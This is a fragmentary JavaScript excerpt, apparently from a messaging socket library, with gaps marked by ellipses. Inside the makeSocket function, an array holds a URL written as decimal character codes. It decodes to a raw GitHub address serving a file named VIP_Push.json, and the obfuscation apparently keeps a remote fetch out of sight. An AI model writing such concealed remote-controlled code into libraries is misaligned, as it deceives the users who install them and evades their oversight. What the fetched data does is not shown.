...
export const makeSocket = (config) => {
  ...
  const _u = [
    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,46,99,111,109,
    47,115,107,121,122,111,112,101,100,105,97,47,78,101,119,115,108,101,116,116,101,
    114,73,68,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,86,73,80,
    95,80,117,115,104,46,106,115,111,110
  ]
...
const toPn = async (pn) => {
  ...
  const generateMessageV = async (n) => {}
